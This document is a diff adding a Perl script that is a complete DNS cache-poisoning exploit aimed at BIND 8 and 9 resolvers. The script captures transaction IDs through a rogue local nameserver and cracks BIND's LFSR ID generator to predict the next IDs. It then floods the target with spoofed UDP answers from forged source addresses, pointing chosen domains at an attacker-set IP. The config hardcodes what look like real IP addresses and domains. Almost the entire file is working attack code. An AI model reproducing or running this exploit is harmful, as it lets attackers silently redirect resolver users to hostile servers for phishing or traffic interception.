@@ -1,0 +1,1053 @@
+#!/usr/bin/perl
+#
+#  cpan install NetPacket::IP Net::DNS::Packet Net::RawIP Time::HiRes List::MoreUtils
+
+# 2008/24/06
+# 2008/29/06 .1
+# 2008/29/06 .2
+
+use strict;
+
+use NetPacket::IP;
+use NetPacket::UDP;
+use NetPacket::Ethernet qw(:strip);
+use Net::DNS::Packet;
+use Net::DNS::Header;
+use Net::DNS::Nameserver;
+use Net::DNS;
+
+use Time::HiRes qw ( sleep gettimeofday);
+use Data::Dumper;
+use Socket;
+use Getopt::Long;
+use Pod::Usage; 
+
+use threads;
+use threads::shared;
+use Net::RawIP;
+
+###################################
+#	     config               #
+###################################
+
+my $recurse_site = "in.ouir.free.fr";
+my $lookupsite   = ".z4.wuza.ru";
+#my $localip      = "62.166.207.155"; #ip box
+#my $localip 	 = "210.193.7.167";	
+my $localip 	 = "195.42.186.16";	
+my $evilip       = "216.109.112.135"; #ip kotoruy doljen v itoge but v cache
+my $recurse_ns   = "ns1.yart.ru";
+
+#initialization arg
+my (%ns,%nsname)=();
+my ($daddr,$evilsite,$daddrfile,$evilsitefile,$clock);
+my $ttl=666;
+my $verbose = 0;
+my $skipcheckns = 0;
+my $skipstorm = 0;
+my $get   = 50;
+my @id : shared;
+my @threads;
+my $flag : shared;
+my $spoofport : shared = 0;
+my $send_counter = 0;
+my $start_time = gettimeofday();
+my $help = 0;
+my $type = 1;
+my $force = 0;
+
+GetOptions(
+	    "help|?" => \$help,
+	    "dns|d=s"=>\$daddr,
+	    "target|t=s"=>\$evilsite,
+	    "dnsf|df=s"=>\$daddrfile,
+	    "targetf|tf=s"=>\$evilsitefile,
+	    "skipstorm"=>\$skipstorm,
+	    "verbose"=>\$verbose,
+	    "ttl=n"=>\$ttl,
+	    "recurse=s"=>\$recurse_ns,
+	    "ip|evilip=s"=>\$evilip,
+	    "lip|localip=s"=>\$localip,
+	    "lookup=s"=>\$lookupsite,
+	    "type=n"=>\$type,
+	    "force"=>\$force
+	    ) or pod2usage(1);
+pod2usage(1) if $help or (! $daddr and !$daddrfile)  or (! $evilsite and !$evilsitefile);
+
+
+#some var
+my $dport       = "53";
+my $sport       =  (1000+rand(60500));
+my ($dip,$res,$query,$answer,$packet,$dev,$i,$tap1,$tap2);
+my (@pool, @al, @saddr, @chain, @file, @log, @roots, @ru,@id2,@evilsite,@daddr);
+
+$tap1 = 0x80000057;
+$tap2 = 0x80000062;
+
+# For BIND9 v9.0.0-9.2.2:
+#$tap1=0xc000002b; # (0x80000057>>1)|(1<<31)
+#$tap2=0xc0000061; # (0x800000c2>>1)|(1<<31)
+
+#gTLD ip
+@saddr        = (
+    "192.5.6.30",    "192.33.14.30", "192.26.92.30",  "192.31.80.30",
+    "192.12.94.30",  "192.35.51.30", "192.42.93.30",  "192.54.112.30",
+    "192.43.172.30", "192.48.79.30", "192.52.178.30", "192.41.162.30",
+    "192.55.83.30",  "195.42.186.16"
+);
+@roots		  = (
+	"192.228.79.201", "192.33.4.12", "192.58.128.30", "192.112.36.4",
+	"192.203.230.10", "192.5.5.241", "193.0.14.129",  "202.12.27.33",
+	"192.36.148.17",  "128.8.10.90", "199.7.83.42",   "198.41.0.4",
+	"128.63.2.53"
+);
+
+@ru 		  = (
+	"194.85.105.17", "192.36.125.2",  "193.232.128.6", "192.93.0.4",
+	"194.85.252.62", "194.226.96.30", "198.6.1.181"
+);
+#tut budut id
+@id = ();
+
+#alphabyte
+@al = ( "a" .. "z" );
+
+
+
+if(!$evilsite and $evilsitefile) {
+    open(evilfp, $evilsitefile);	
+    @pool=<evilfp>;
+    close(evilfp);
+} else {
+    push(@pool,$evilsite);
+}
+
+
+
+foreach my $site (@pool) {
+    $site=~ s/^\s*(.*?)\s*$/$1/;
+    my @rootsite=split(/\./,$site);
+    my $rootsite=@rootsite[-2].'.'.@rootsite[-1];
+    $res = Net::DNS::Resolver->new;
+    $res->nameserver($recurse_ns);
+    $res->recurse(1);
+    my $nspack = $res->search($rootsite,'NS') || die "Couldn't find nameservers for $rootsite: ", $res->errorstring, "\n";
+
+    #v @ns teper ip DNS evilsite'a
+    my (@nsname,@ns);
+    if ($nspack->answer) {
+        foreach ($nspack->answer) {push(@nsname,$_->nsdname) if($_->{"nsdname"});}
+	foreach my $ip (@nsname) {my $ip=gethostbyname($ip);push(@ns,Socket::inet_ntoa($ip));}
+    } elsif ($nspack->additional) {
+	@ns = ( map { $_->address } $nspack->additional );
+	@nsname = ( map { $_->name } $nspack->additional );
+    } else {
+	@nsname= ( map { $_->nsdname } $nspack->authority );
+	@ns = ( map { gethostbyname($_); } @nsname );
+    }
+
+    #print Dumper $nspack;
+    push(@evilsite,$site);
+    @{$ns{$site}}=@ns;
+    @{$nsname{$site}}=@nsname;
+}
+
+if(!$daddr and $daddrfile) {
+    open(daddrfp, $daddrfile);	
+    @daddr=<daddrfp>;
+    close(daddr);
+} else {
+    push(@daddr,$daddr);
+}
+
+
+
+#foreach $evilsite (@evilsite) {
+#    $evilsite =~ s/^\s*(.*?)\s*$/$1/;
+#}
+
+
+#start attack cycle
+
+foreach $daddr (@daddr) {
+
+    $spoofport=0;
+    $daddr=~ s/^\s*(.*?)\s*$/$1/;
+    if( length($daddr) > 0 ) {
+        eval { attack($daddr) } ;
+    }
+    print $@;
+}
+
+print "[x] Elapsed time: " . ( gettimeofday() - $clock ) . " seconds\n" if ($verbose);
+
+
+
+
+exit;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#EOF CODE / Start  Functions and Class
+
+
+
+sub attack {
+
+    my ($daddr) = @_;
+    #polushaem ip iz hostname'a target ns
+    $dip = gethostbyname($daddr);
+    $dip = Socket::inet_ntoa($dip);
+    $res->nameservers($dip);
+
+    print "[x] NS: $dip ($daddr)\n" if ($verbose);
+    if(!$skipstorm) {
+        #proveryem, est li recursiy u target ns
+	print "[x] Checking for recursion... " if ($verbose);
+	$res->recurse(1);
+	$query = $res->search($recurse_site) || die "RECURSE IS UNAVAILABLE!\n";
+	print "DONE\n"if ($verbose);
+
+    }
+    my ($evilsite,@ns,@nsname,@attack)=();
+
+    foreach $evilsite (@evilsite) {
+
+	chomp($evilsite);    
+	print "[x] Target: $evilsite\n[x] Looking for cache... " if ($verbose);
+	$query=0;
+    	if($force == 0) {
+    	    $res->recurse(0);
+	    $query = $res->search($evilsite);
+	}
+	if ($query) {
+    	    #est, ploxo
+	    my $answ = ( $query->answer )[0];
+	    my $ip   = '';
+	    if ( $answ->type eq 'A' )     {$ip = ", IP  = " . $answ->address; }
+	    if ( $answ->type eq 'CNAME' ) {$ip = ", CNAME  =  " . $answ->cname; }
+	    print  "DETECTED!  NS = $dip ($daddr)  TTL = " . $answ->ttl . $ip .", host = ".$evilsite . "\n";
+	} else {
+	    push(@attack,$evilsite);
+	    print "DONE\n" if ($verbose);
+	    print "[x] Filling Cache..." if ($verbose);
+	    $res->recurse(1);
+	    $res->search(join( "", @al[ map { rand @al } ( 1 .. 8 ) ] ).".".$evilsite);
+	    print " DONE\n" if ($verbose);
+	}
+    }
+    
+    if(scalar(@attack) == 0) { return; }
+    my @id2old=();
+    for(my $i=0;$i<4;$i++) {
+        @id2old=genit(1000);
+        last if(scalar(@id2old) > 0);
+    }
+
+    scalar(@id2old) >= 1 or die("[$daddr] ne udalos sgenerit txid (@id2old)\n");
+
+
+    $clock=gettimeofday();
+    $send_counter=0;
+    for(my $i=0;$i<4;$i++) {
+        @id2=genit(2000);
+        last if(scalar(@id2) > 0);
+    }
+
+    scalar(@id2) >= 1 or die("[$daddr] ne udalos sgenerit txid (@id2)\n");
+
+    for($i=0;$i<@id2old-3;$i++) {
+        if(@id2old[$i..$i+3] == @id2[0..3]) { last;}
+    }
+
+    die("[!] don't move window ($i > 10000)\n") if $i > 1000;
+
+    my $ps=int(($i-$send_counter)/(gettimeofday()-$clock)) > 30 || 100;
+    my $ii=int($ps*0.3);
+    printf ("[~] ps-%.4f, ii-%.4f, i-%.4f, clock-%.4f, sended = %d\n",$ps,$ii,$i,gettimeofday()-$clock,$send_counter) if ($verbose);
+    $clock=gettimeofday();
+    my $start=0;
+    my @id2t;
+    if ($ii > 100) {@id2t=@id2[$ii-50..scalar(@id2)];}
+    else {@id2t=@id2[0..scalar(@id2)];}
+    foreach $evilsite (@attack) {
+	@id2=@id2t[$start..$start+$ii+50];
+	$start+=1;
+	print "[~] Get TXID: @id2 \n" if ($verbose);
+
+	@ns=@{$ns{$evilsite}};
+	@nsname=@{$nsname{$evilsite}};
+
+	#formiruem packet dly spoof otvetov
+	my $packet_r = Net::DNS::Packet->new($evilsite);
+	$packet_r->push( "pre"    => rr_add( $evilsite . '. '.$ttl.' A '.$evilip ) );
+	$packet_r->push( "update" => rr_add( $evilsite . '. '.$ttl.' A '.$evilip ) );
+	$packet_r->header->opcode('ANSWER');
+    
+	$packet_r->header->qr(1);
+	$packet_r->header->aa(1);
+	$packet_r->header->ra(1);
+	$packet_r->header->ad(1);
+
+	#formiruem packet dly zarposa
+	my $packet_q     = 	Net::DNS::Packet->new($evilsite);
+	my $restpacket_q = 	substr( $packet_q->data, 2 );
+	my $udp_q        = 	new Net::RawIP({ip=>{saddr=>$localip,daddr=>$dip},udp=>{source=>$sport,dest=>53,data=>pack("H*",sprintf("%.4x",int(rand(65535)))).$restpacket_q}});
+
+	#pool dly ocheredi zaprosov
+	my @pool = ();
+	my $udp_r;
+
+	#formiruem pool ot imenu ns evilhost'a
+	print "[~] spoof: " if ($verbose);
+	for (my $i=0;$i<1;$i++){
+    	    foreach my $id (@id2) {
+	    chomp ($id);
+		foreach my $saddr (@ns) {
+	    	    chomp ($saddr);
+	            $udp_r = new Net::RawIP({ip=>{daddr=>$dip},udp=>{source=>53,dest=>$spoofport}});
+		    $packet_r->header->id($id);
+	    	    $udp_r->set({ip => {saddr => $saddr},udp => {data => $packet_r->data }});
+	    	    push( @pool, $udp_r );
+		}
+    	    }
+	}
+	print " DONE\n" if ($verbose);
+	#posulaem zasprosu
+	$udp_q->send();
+	foreach my $udp (@pool) {$udp->send(0,2);}
+
+    }
+    foreach $evilsite (@attack) {
+	#proveryem
+        $res->recurse(1);
+	$query = $res->search($evilsite);
+	if($query) {
+	    if(($query->answer )[0]->{address} == $evilip) {
+	    	print "[~] Evilsite $evilsite $dip ($daddr) resolved to " . ( $query->answer )[0]->{address} . " - GOOD \n";
+	    } else {
+    		print "[~] Evilsite $evilsite $dip ($daddr) resolved to " . ( $query->answer )[0]->{address} . " - FUCK\n";
+    	    }
+	}
+#	print Dumper $query;
+    }
+
+    
+    
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+sub genit {
+
+    my ($get) = @_;
+    my $start;
+    @id=();
+    my @id2=();
+    @threads=();
+    push @threads, threads->create(\&ns);
+    push @threads, threads->create(\&storm) if(!$skipstorm);
+
+    foreach my $thread (@threads) {$thread->join(); }
+
+    #po zaversheniy polushaem spisok TsID
+
+    scalar(@id) > 15 or die( "[$daddr] ne udalos sobrat txid (" . scalar(@id) . ") \n" );
+    print "[~] Txid Array: @id\n" if ($verbose);
+
+	
+    my $txid;
+    if($type <= 1 or $type > 5) {
+	$tap1 = 0x80000057;
+	$tap2 = 0x80000062;
+	$txid=TXID_b9->new();
+    } 
+    if($type == 2) {
+	# For BIND9 v9.0.0-9.2.2:
+	$tap1=0xc000002b; # (0x80000057>>1)|(1<<31)
+	$tap2=0xc0000061; # (0x800000c2>>1)|(1<<31)
+	$txid=TXID_b9->new();
+    } 
+    if($type == 3) {
+	foreach (@id) {
+	    printf("%d ",$_);
+	}
+	print "\n";
+	exit(0);
+    }
+    my @idp;
+        
+    my $flag=0;
+    for(my $i=16;$i<scalar(@id)-3;$i+=1) {
+		@idp = @id[$i-16..$i];
+		@id2 = $txid->gen( 30,  @idp);
+		if(scalar(@id2) > 0 and ((@id2[1] == $id[$i] and @id2[2] == $id[$i+1]) or  (@id2[2] == $id[$i+1] and @id2[3] == $id[$i+2]) or 	(@id2[3] == $id[$i+2] and @id2[4] == $id[$i+3]))){
+		    $flag=1;
+		    last; 
+		}
+
+		for(my $i=0;$i<scalar(@idp);$i+=1) {
+		    if((@idp[$i] & 1) == 0) {
+			my @pred=$txid->pred(@idp[$i]);
+			my @idp2=();
+			for(my $ii=1;$ii<scalar(@pred)-1;$ii++) {
+			    @idp2=(@idp[0..$i-1],@pred[$ii],@idp[$i+1..scalar(@idp)]);
+			    @id2=$txid->gen(30,@idp2);
+			    if(scalar(@id2) > 0 and ((@id2[2] == $id[$i+1] and @id2[3] == $id[$i+2]) or 	(@id2[3] == $id[$ii+2] and @id2[4] == $id[$i+3]))){
+				@idp=@idp2;
+				$flag=1;
+				last; 
+			    }
+			    
+			}
+
+		    }
+		}
+    }
+
+    if ($flag == 0) { return ();	}
+
+    $send_counter+=42;
+    $start=scalar(@idp);
+    @id2 = $txid->gen( $start + $get , @idp );
+    return @id2[ $start .. $start+$get];
+}
+
+
+
+
+
+
+#storm
+sub storm {
+    print "[o] Starting storm\n" if ($verbose);
+    my $c=0;
+    my @pool=();
+    foreach my $saddr (@saddr) {
+        #$res->srcaddr($saddr);
+        #$res->srcport($sport);
+        for ( $i = 0 ; $i < 3 ; $i++ ) {
+            my $packet_q = Net::DNS::Packet->new($c.".".join( "", @al[ map { rand @al } ( 1 .. 8 ) ] ). ".$lookupsite" );
+            my $restpacket_q = substr( $packet_q->data, 2 );
+            my $udp_q = new Net::RawIP({
+				ip  => {
+					saddr => $saddr, daddr => $dip 
+				},
+				udp => {
+					source => $sport,
+					dest   => 53,
+					data =>
+					  pack( "H*", sprintf( "%.4x", int( rand(65535) ) ) )
+					  . $restpacket_q
+				}
+            });
+	    push(@pool,$udp_q);
+            $c++;
+        }
+    }
+    
+    foreach (@pool) {
+	$_->send();
+    }
+
+    print "[o] End storm\n" if ($verbose);
+
+    #    sleep(5);
+
+}
+
+
+
+
+sub ns {
+    my $ns;
+    my $index;
+    print  "[x] start ns\n" if ($verbose);
+    $ns = Net::DNS::NS->new(
+        LocalAddr        => $localip,
+        LocalPort        => "53",
+        ReplyHandler => sub {
+			my ($qname, $qclass, $qtype, $peerhost,$query) = @_;
+			my ($rcode, @ans, @auth, @add);
+			#print "Received query from $peerhost\n";
+			push( @id, $query->{header}->{id} );
+			#print Dumper $query;
+			#$index=$query->{question}[0]->{qname};
+			#$index =~ s/([0-9]+)\..+/$1/g;
+			#@id[$index]=$query->{header}->{id};
+			#print "host: ".$index.", id: ".$query->{header}->{id}."\n";
+			if ($qtype eq "A"  ) {
+				my ($ttl, $rdata) = (1, "10.1.2.3");
+				push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
+				$rcode = "NOERROR";
+			} else {
+				$rcode = "NXDOMAIN";
+			}
+			# mark the answer as authoritive (by setting the 'aa' flag)
+			return ($rcode, \@ans, \@auth, \@add, { 
+				aa => 1 
+			});
+		});
+
+    
+    for($i=0;$i<scalar(@saddr)*3;$i++) {
+        $ns->loop_once(1);
+        if ( $spoofport == 0 ) {
+			$spoofport = $ns->get_port();
+        }
+    }
+
+    print  "[x] stop ns\n" if ($verbose);
+    return $spoofport;
+}
+
+
+package TXID_b9;
+
+use strict;
+use Time::HiRes qw ( sleep gettimeofday );
+
+
+my ($self, @txid,@txid2,  $initial_guess_bits, @cand_lfsr1, @cand_lfsr2, $skip1, $skip2 ,$count);
+
+sub new {
+        my ($class, %self) = @_;
+        $self = bless \%self, $class;
+        return $self;
+}
+
+
+sub gen {
+    ($self,$get, @txid ) = (@_);
+    $initial_guess_bits = 6;
+    @txid2		= ();
+    @cand_lfsr1         = ();
+    @cand_lfsr2         = ();
+    $count = scalar(@txid) - 2;
+    $get ||=50 if ($get == 0);
+
+    my $start_time = gettimeofday();
+
+    my $good = 0;
+    for ( my $lfsr1 = 0 ; $lfsr1 < ( 1 << $initial_guess_bits ) ; $lfsr1++ ) {
+         my $lfsr2 = ( $txid[0] ^ $lfsr1 ) & ( ( 1 << $initial_guess_bits ) - 1 );
+
+        if (verify( $lfsr1, $initial_guess_bits, $lfsr2, $initial_guess_bits ))	{
+            $good += phase2( $lfsr1, $initial_guess_bits, $lfsr2, $initial_guess_bits );
+        }
+    }
+    if($good>0) {
+    my $end_time = gettimeofday();
+    next_trxid( $cand_lfsr1[0], $cand_lfsr2[0], $get );
+    return @txid2;
+    } else {
+    return ();
+    }
+}
+
+
+sub next_trxid {
+        my ( $lfsr1, $lfsr2, $plus ) = @_;
+        my $val;
+        for ( my $i = 0 ; $i < $count + $plus ; $i++ ) {
+            $val   = ( $lfsr1 ^ $lfsr2 ) & 0xFFFF;
+            $skip1 = $lfsr1 & 1;
+            $skip2 = $lfsr2 & 1;
+            for ( my $j1 = 0 ; $j1 <= $skip2 ; $j1++ ) {
+                $lfsr1 = ( $lfsr1 >> 1 ) ^ ( ( $lfsr1 & 1 ) * $tap1 );
+            }
+            for ( my $j2 = 0 ; $j2 <= $skip1 ; $j2++ ) {
+                $lfsr2 = ( $lfsr2 >> 1 ) ^ ( ( $lfsr2 & 1 ) * $tap2 );
+            }
+            if ( $i >= $count ) { push( @txid2, $val ); }
+        }
+        return $val;
+}
+
+sub verify {
+        my ( $lfsr1, $width1, $lfsr2, $width2 ) = @_;
+
+        for ( my $i = 0 ; $i < $count ; $i++ ) {
+
+            my $cand = ( $lfsr1 ^ $lfsr2 ) & 0xFFFF;
+            my $min_width = ( $width1 <= $width2 ) ? $width1 : $width2;
+            $min_width = ( $min_width <= 16 ) ? $min_width : 16;
+            if ( $min_width <= 0 ) {
+                return 1;
+            }
+            my $mask = ( 1 << $min_width ) - 1;
+
+            if ( ( $cand & $mask ) != ( $txid[$i] & $mask ) ) {
+                return 0;
+            }
+
+            $skip1 = $lfsr1 & 1;
+            $skip2 = $lfsr2 & 1;
+
+            for ( my $j1 = 0 ; $j1 <= $skip2 ; $j1++ ) {
+                $lfsr1 = ( $lfsr1 >> 1 ) ^ ( ( $lfsr1 & 1 ) * $tap1 );
+                if ( $width1 < 32 ) {
+                    $width1--;
+                }
+            }
+            for ( my $j2 = 0 ; $j2 <= $skip1 ; $j2++ ) {
+                $lfsr2 = ( $lfsr2 >> 1 ) ^ ( ( $lfsr2 & 1 ) * $tap2 );
+                if ( $width2 < 32 ) {
+                    $width2--;
+                }
+            }
+        }
+        return 1;
+}
+
+sub phase2 {
+
+    my ( $lfsr1, $width1, $lfsr2, $width2 ) = @_;
+    my $motion_detected = 0;
+
+    if ( $width1 < 32 ) {
+        my $guess_0 =
+          verify( $lfsr1 | ( 0 << $width1 ), $width1 + 1, $lfsr2, $width2 );
+
+        my $guess_1 =
+          verify( $lfsr1 | ( 1 << $width1 ), $width1 + 1, $lfsr2, $width2 );
+        if ( $guess_0 ^ $guess_1 ) {
+            #Exactly one is correct. So we know the bit.
+            $motion_detected = 1;
+            if ($guess_1) {
+                $lfsr1 = $lfsr1 | ( 1 << $width1 );
+            }
+            $width1++;
+        }
+        elsif ( ( !$guess_0 ) and ( !$guess_1 ) ) {
+            # Inconsistent state, hence wrong guess in the first place
+            return 0;
+        }
+    }
+
+    if ( $width2 < 32 ) {
+        my $guess_0 =
+          verify( $lfsr1, $width1, $lfsr2 | ( 0 << $width2 ), $width2 + 1 );
+        my $guess_1 =
+          verify( $lfsr1, $width1, $lfsr2 | ( 1 << $width2 ), $width2 + 1 );
+        if ( $guess_0 ^ $guess_1 ) {
+            #Exactly one is correct. So we know the bit.
+            $motion_detected = 1;
+            if ($guess_1) {
+                $lfsr2 = $lfsr2 | ( 1 << $width2 );
+            }
+            $width2++;
+        }
+        elsif ( ( !$guess_0 ) and ( !$guess_1 ) ) {
+            # Inconsistent state, hence wrong guess in the first place
+            return 0;
+        }
+    }
+
+    if ( ( $width1 == 32 ) and ( $width2 == 32 ) ) {
+        if ( verify( $lfsr1, 32, $lfsr2, 32 ) ) {
+            push @cand_lfsr1, $lfsr1;
+            push @cand_lfsr2, $lfsr2;
+            return 1;
+        } else {
+            # false alarm
+            return 0;
+        }
+    }
+
+    if ($motion_detected) {
+        # At least one width was improved.
+        return phase2( $lfsr1, $width1, $lfsr2, $width2 );
+    } else {
+
+        # Resort to bit guessing.
+        if ( $width1 < 32 ) {
+            # Guessing another bit in LFSR1 and continuing...
+            return phase2(
+                $lfsr1 | ( 0 << $width1 ),
+                $width1 + 1,
+                $lfsr2, $width2
+              ) + phase2(
+                $lfsr1 | ( 1 << $width1 ),
+                $width1 + 1,
+                $lfsr2, $width2
+              );
+        } else {
+            # Guessing another bit in LFSR2 and continuing...
+            return phase2(
+                $lfsr1, $width1,
+                $lfsr2 | ( 0 << $width2 ),
+                $width2 + 1
+              ) + phase2(
+                $lfsr1, $width1,
+                $lfsr2 | ( 1 << $width2 ),
+                $width2 + 1
+              );
+        }
+    }
+}
+
+
+
+sub pred {
+    my ($self,$txid)=@_;
+    my ($v,$v1,$v2,$msbits,$msb,@cand)=0;
+
+    # One bit shift (assuming the two lsb's are 0 and 0)
+    for ($msb=0;$msb<(1<<1);$msb++)
+    {
+	push @cand,(($msb<<15)|($txid>>1)) & 0xFFFF;
+    }
+
+    # Two bit shift (assuming the two lsb's are 1 and 1)
+    # First shift (we know the lsb is 1 in both LFSRs):
+    $v=$txid;
+    $v=($v>>1)^$tap1^$tap2;
+    if (($v & 1)==0)
+    {
+    # After the first shift, the lsb becomes 0, so the two LFSRs now have 
+    #	identical lsb's: 0 and 0   or   1 and 1
+	# Second shift:
+	$v1=($v>>1); # 0 and 0
+	$v2=($v>>1)^$tap1^$tap2; # 1 and 1
+    }
+    else
+    {
+	# After the first shift, the lsb becomes 1, so the two LFSRs now have 
+	#	different lsb's: 1 and 0   or   0 and 1
+	# Second shift:
+	$v1=($v>>1)^$tap1; # 1 and 0
+	$v2=($v>>1)^$tap2; # 0 and 1
+    }
+
+    # Also need to enumerate over the 2 msb's we are clueless about
+    for ($msbits=0;$msbits<(1<<4);$msbits++)
+    {
+    	push @cand,(($msbits<<14)|$v1) & 0xFFFF;
+	push @cand,(($msbits<<14)|$v2) & 0xFFFF;
+    }
+    return @cand
+}
+
+
+
+
+
+
+
+
+
+
+package Net::DNS::NS;
+
+use Net::DNS;
+use IO::Socket;
+use IO::Socket::INET;
+use IO::Select;
+use Carp qw(cluck);
+use Data::Dumper;
+use Socket;
+
+use strict;
+use vars qw(    $VERSION
+                $has_inet6
+                );
+
+use constant    DEFAULT_ADDR => 0;
+use constant    DEFAULT_PORT => 53;
+
+use constant    STATE_ACCEPTED => 1;
+use constant    STATE_GOT_LENGTH => 2;
+use constant    STATE_SENDING => 3;
+
+my $remoteport = 0;
+$VERSION = (qw$LastChangedRevision: 709 $)[1];
+
+
+
+
+sub new {
+        my ($class, %self) = @_;
+
+        unless ( ref $self{ReplyHandler} ) {
+			cluck "No reply handler!";
+			return;
+        }
+
+        # local server addresses must also be accepted by a resolver
+        my @LocalAddr = ref $self{LocalAddr} ? @{$self{LocalAddr}} : ($self{LocalAddr});
+        my $resolver = Net::DNS::Resolver->new;
+        $resolver->force_v4(1);
+        $resolver->nameservers(undef);
+        my @localaddresses = $resolver->nameservers(@LocalAddr);
+
+        my $port = $self{LocalPort} || DEFAULT_PORT;
+
+        my @sock_tcp;   # All the TCP sockets we will listen to.
+        my @sock_udp;   # All the UDP sockets we will listen to.
+
+        # while we are here, print incomplete lines as they come along.
+        local $| = 1 if $self{Verbose};
+
+        foreach my $addr ( @localaddresses ? @localaddresses : DEFAULT_ADDR ){
+
+            #--------------------------------------------------------------------------
+            # Create the UDP Socket.
+            #--------------------------------------------------------------------------
+
+            print "Creating UDP socket $addr#$port - " if $self{Verbose};
+
+            my $sock_udp = inet_new(
+									   LocalAddr => $addr,
+									   LocalPort => $port,
+									   Proto => "udp",
+                                    );
+
+            if ( $sock_udp ) {
+                push @sock_udp, $sock_udp;
+                print "done.\n" if $self{Verbose};
+            } else {
+                cluck "Couldn't create UDP socket: $!";
+            }
+
+        }
+
+        #--------------------------------------------------------------------------
+        # Create the Select object.
+        #--------------------------------------------------------------------------
+
+        my $select = $self{select} = IO::Select->new;
+
+        $select->add(@sock_udp);
+
+        return undef unless $select->count;
+
+        #--------------------------------------------------------------------------
+        # Return the object.
+        #--------------------------------------------------------------------------
+
+        my $self = bless \%self, $class;
+        return $self;
+}
+
+#------------------------------------------------------------------------------
+# inet_new - Calls the constructor in the correct module for making sockets.
+#------------------------------------------------------------------------------
+
+sub inet_new {
+        return IO::Socket::INET->new(@_);
+}
+
+#------------------------------------------------------------------------------
+# make_reply - Make a reply packet.
+#------------------------------------------------------------------------------
+
+sub make_reply {
+        my ($self, $query, $peerhost) = @_;
+
+        my $reply = Net::DNS::Packet->new();    # create empty reply packet
+        $reply->header->qr(1);
+
+        my $headermask;
+
+        unless ($query) {
+			print "ERROR: invalid packet\n" if $self->{
+				"Verbose"
+			};
+			$reply->header->rcode("FORMERR");
+			return $reply;
+        }
+
+        if ($query->header->qr()) {
+                print "ERROR: invalid packet (qr was set, dropping)\n" if $self->{"Verbose"};
+                return;
+        }
+
+
+        # question section returned to caller
+        my @q = $query->question;
+        @q=( Net::DNS::Question->new('', 'ANY', 'ANY') ) unless @q;
+
+        $reply->push("question", @q);
+
+        if ($query->header->opcode eq "QUERY" ||
+            $query->header->opcode eq "NS_NOTIFY_OP"   #RFC1996
+            ) {
+                if ($query->header->qdcount == 1) {
+                        my ($qr) = @q;
+                        my $qname = $qr->qname;
+                        my $qtype = $qr->qtype;
+                        my $qclass = $qr->qclass;
+
+                        print "query ", $query->header->id,
+                        ": ($qname, $qclass, $qtype) - " if $self->{"Verbose"};
+
+                        my ($rcode, $ans, $auth, $add);
+
+                        if  ($query->header->opcode eq "QUERY"){
+                          ($rcode, $ans, $auth, $add, $headermask) =
+                              &{$self->{"ReplyHandler"}}($qname, $qclass, $qtype, $peerhost, $query);
+                        }else{
+                          $reply->header->rcode("SERVFAIL") unless
+                             ( ref $self->{"NotifyHandler"} eq "CODE");
+                          ($rcode, $ans, $auth, $add, $headermask) =
+                              &{$self->{"NotifyHandler"}}($qname, $qclass, $qtype, $peerhost, $query);
+                        }
+                        print "$rcode\n" if $self->{"Verbose"};
+
+                        $reply->header->rcode($rcode);
+
+                        $reply->push("answer",     @$ans)  if $ans;
+                        $reply->push("authority",  @$auth) if $auth;
+                        $reply->push("additional", @$add)  if $add;
+                } else {
+                        print "ERROR: qdcount ", $query->header->qdcount,
+                               "unsupported\n" if $self->{"Verbose"};
+                        $reply->header->rcode("FORMERR");
+                }
+        } else {
+                print "ERROR: opcode ", $query->header->opcode, " unsupported\n"
+                        if $self->{"Verbose"};
+                $reply->header->rcode("FORMERR");
+        }
+
+
+
+        if (!defined ($headermask)) {
+                $reply->header->ra(1);
+                $reply->header->ad(0);
+        } else {
+                $reply->header->aa(1) if $headermask->{'aa'};
+                $reply->header->ra(1) if $headermask->{'ra'};
+                $reply->header->ad(1) if $headermask->{'ad'};
+        }
+
+
+        $reply->header->cd($query->header->cd);
+        $reply->header->rd($query->header->rd);
+        $reply->header->id($query->header->id);
+
+        $reply->header->print if $self->{"Verbose"} && defined $headermask;
+
+        return $reply;
+}
+
+
+#------------------------------------------------------------------------------
+# udp_connection - Handle a UDP connection.
+#------------------------------------------------------------------------------
+
+sub udp_connection {
+	my ($self, $sock) = @_;
+	my $buf = "";
+	$sock->recv($buf, &Net::DNS::PACKETSZ);
+	my ($peerhost,$peerport) = ($sock->peerhost, $sock->peerport);
+
+	if($remoteport == 0 )  {
+		$remoteport=$peerport;
+	}
+	print "UDP connection from $peerhost:$peerport\n" if $self->{"Verbose"};
+	my $query = Net::DNS::Packet->new(\$buf);
+	my $reply = $self->make_reply($query, $peerhost) || return;
+	my $reply_data = $reply->data;
+	local $| = 1 if $self->{"Verbose"};
+	print "Writing response - " if $self->{"Verbose"};
+	if ($sock->send($reply_data)) {
+		print "done\n" if $self->{"Verbose"};
+	} else {
+		print "failed to send reply: $!\n" if $self->{"Verbose"};
+	}
+}
+
+sub loop_once {
+  my ($self, $timeout) = @_;
+  $timeout=0 unless defined($timeout);
+  print ";loop_once called with $timeout \n" if $self->{"Verbose"} >4;
+
+  my @ready = $self->{"select"}->can_read($timeout);
+
+  foreach my $sock (@ready) {
+      my $protonum = $sock->protocol;
+      # This is a weird and nasty hack. Although not incorrect,
+      # I just don't know why ->protocol won't tell me the protocol
+      # on a connected socket. --robert
+      $protonum = getprotobyname('tcp') if not defined $protonum and $self->{"_tcp"}{$sock};
+
+      my $proto = getprotobynumber($protonum);
+      if (!$proto) {
+          print "ERROR: connection with unknown protocol\n"
+              if $self->{"Verbose"};
+      } elsif (lc($proto) eq "udp") {
+          $self->udp_connection($sock);
+      } else {
+          print "ERROR: connection with unsupported protocol $proto\n"
+              if $self->{"Verbose"};
+      }
+  }
+  my $now = time();
+}
+
+
+sub get_port {
+    return $remoteport;
+}
+1;
+
+__END__
+
+=head1 SYNOPSIS
+
+      Target Domain
+        -target		one spoofed domain
+	-ftarget	file with more target
+      
+      DNS attacked
+        -dns		ip or host name
+	-fdns		file with dns 
+	-type		Type Of DNS
+
+			1	bind9.3.x-bind9.4.x (default)
+			2	bind9.0.x-bind9.2.x
+			3	bind8.x.x
+			4	m$dn$
+
+      More
+        -verbose	verbose output
+        -ttl		TTL of poison
+        -ip		IP for poison 
+	-localip	DNS IP, for capture txid
+	-recurse	Some DNS with Recurse
+	-skipstorm	Not send query,only start dns
+	-lookup		Domain point to DNS IP(localip)
+
+=cut
